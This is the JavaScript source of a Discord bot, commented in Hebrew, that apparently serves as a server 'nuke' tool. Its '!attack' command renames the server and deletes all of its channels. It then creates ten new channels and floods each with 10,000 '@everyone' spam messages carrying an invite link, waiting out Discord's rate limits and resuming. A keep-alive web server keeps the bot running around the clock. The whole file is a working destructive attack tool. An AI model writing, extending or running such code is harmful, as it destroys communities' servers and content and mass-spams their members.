const { Client, GatewayIntentBits } = require('discord.js');
const fs = require('fs').promises;
const path = require('path');
const http = require('http');

// 🌍 שרת אינטרנט בשביל Render כדי לשמור על הבוט דולק 24/7
http.createServer((req, res) => {
    res.write("Bot is running!");
    res.end();
}).listen(process.env.PORT || 3000);

async function loadConfig() {
    const configPath = path.join(__dirname, 'config.json');
    const configData = await fs.readFile(configPath, 'utf-8');
    return JSON.parse(configData);
}

// פונקציית עזר להפסקות קצרות למניעת חסימות
const sleep = (ms) => new Promise((resolve) => setTimeout(resolve, ms));

async function main() {
    const config = await loadConfig();
    
    // משיכת הטוקן בצורה מאובטחת מהאתר Render
    const botToken = config.token === "PROCESS_ENV_TOKEN" ? process.env.DISCORD_TOKEN : config.token;

    const client = new Client({
        intents: [
            GatewayIntentBits.Guilds,
            GatewayIntentBits.GuildMessages,
            GatewayIntentBits.MessageContent
        ]
    });

    const prefix = '!';

    client.once('ready', () => { 
        console.log(`Logged in as ${client.user.tag}! מוכן להצפת 10,000 הודעות.`); 
    });

    client.on('messageCreate', async message => {
        if (!message.content.startsWith(prefix) || message.author.bot) return;
        const args = message.content.slice(prefix.length).trim().split(/ +/);
        const command = args.shift().toLowerCase();

        if (command === 'attack') {
            console.log('Massive 10,000 spam attack started...');

            // 1. שינוי שם השרת הכללי
            await message.guild.setName(config.newServerName).catch(console.error);
            
            // 2. מחיקה של כל החדרים הקיימים בשרת הנוכחי
            const channels = await message.guild.channels.fetch();
            for (const channel of channels.values()) { 
                await channel.delete().catch(console.error); 
                await sleep(50);
            }

            // 3. יצירת 10 חדרים חדשים בשם שביקשת
            const newChannels = [];
            for (let i = 0; i < 10; i++) {
                const created = await message.guild.channels.create({ 
                    name: 'כנסו-עברנו-שרת', 
                    type: 0 
                }).catch(console.error);
                if (created) newChannels.push(created);
                await sleep(50);
            }

            // 4. שליחת 10,000 הודעות ספאם בכל אחד מהחדרים במקביל עם מנגנון הגנה מחסימות
            newChannels.forEach(async (channel) => {
                for (let i = 0; i < 10000; i++) {
                    try {
                        await channel.send('@everyone כנסו עברנו שרת https://discord.gg');
                        // הפסקה קטנטנה בין הודעה להודעה כדי לשמור על יציבות
                        await sleep(80); 
                    } catch (error) {
                        // אם דיסקורד חוסם אותנו זמנית (Rate Limit), הקוד ימתין 2 שניות וימשיך אוטומטית
                        if (error.status === 429) {
                            console.log('Rate limit hit, sleeping...');
                            await sleep(2000);
                        } else {
                            console.error(error);
                        }
                    }
                }
            });
        }
    });

    client.login(botToken);
}

main().catch(console.error);
